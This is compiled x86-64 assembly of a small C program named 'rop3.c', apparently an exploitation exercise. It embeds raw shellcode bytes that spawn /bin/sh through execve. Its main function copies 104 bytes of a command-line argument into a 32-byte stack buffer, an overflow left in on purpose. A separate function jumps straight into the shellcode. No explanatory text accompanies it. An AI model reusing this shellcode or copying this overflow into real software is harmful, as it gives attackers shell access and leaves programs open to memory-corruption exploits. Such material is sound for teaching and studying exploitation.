	.file	"rop3.c"
	.globl	shellcode2
	.data
	.align 32
	.type	shellcode2, @object
	.size	shellcode2, 71
shellcode2:
	.string	"\353'[H\211[\bH1\300\210c\007H\211C\020\211\302\260;H\213{\bH\215s\b\017\005H1\311H\211\317\260<\017\005\350\324\377\377\377/bin/sh                 "
	.text
	.globl	main
	.type	main, @function
main:
.LFB2:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	pushq	%rbx
	subq	$40, %rsp
	.cfi_offset 3, -24
	movl	%edi, -36(%rbp)
	movq	%rsi, -48(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -24(%rbp)
	xorl	%eax, %eax
	movq	-48(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rcx
	leaq	-32(%rbp), %rax
	movl	$104, %edx
	movq	%rcx, %rsi
	movq	%rax, %rdi
	call	memcpy
	leaq	-32(%rbp), %rax
	addq	$30, %rax
	movl	$3, %edx
	movl	$0, %esi
	movq	%rax, %rdi
	call	memset
	leaq	-32(%rbp), %rax
	addq	$34, %rax
	movl	$6, %edx
	movl	$0, %esi
	movq	%rax, %rdi
	call	memset
	leaq	-32(%rbp), %rax
	addq	$46, %rax
	movl	$2, %edx
	movl	$0, %esi
	movq	%rax, %rdi
	call	memset
	leaq	-32(%rbp), %rax
	addq	$49, %rax
	movl	$7, %edx
	movl	$0, %esi
	movq	%rax, %rdi
	call	memset
	leaq	-32(%rbp), %rax
	addq	$62, %rax
	movl	$3, %edx
	movl	$0, %esi
	movq	%rax, %rdi
	call	memset
	leaq	-32(%rbp), %rax
	addq	$67, %rax
	movl	$5, %edx
	movl	$0, %esi
	movq	%rax, %rdi
	call	memset
	leaq	-32(%rbp), %rax
	addq	$78, %rax
	movl	$2, %edx
	movl	$0, %esi
	movq	%rax, %rdi
	call	memset
	leaq	-32(%rbp), %rax
	addq	$86, %rax
	movl	$2, %edx
	movl	$0, %esi
	movq	%rax, %rdi
	call	memset
	leaq	-32(%rbp), %rax
	addq	$94, %rax
	movl	$2, %edx
	movl	$0, %esi
	movq	%rax, %rdi
	call	memset
	leaq	-32(%rbp), %rax
	addq	$99, %rax
	movl	$5, %edx
	movl	$0, %esi
	movq	%rax, %rdi
	call	memset
	movq	-24(%rbp), %rbx
	xorq	%fs:40, %rbx
	je	.L2
	call	__stack_chk_fail
.L2:
	addq	$40, %rsp
	popq	%rbx
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE2:
	.size	main, .-main
	.globl	test
	.type	test, @function
test:
.LFB3:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$16, %rsp
	movq	$shellcode2, -8(%rbp)
	movq	-8(%rbp), %rdx
	movl	$0, %eax
	call	*%rdx
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE3:
	.size	test, .-test
	.ident	"GCC: (Ubuntu 4.8.4-2ubuntu1~14.04) 4.8.4"
	.section	.note.GNU-stack,"",@progbits
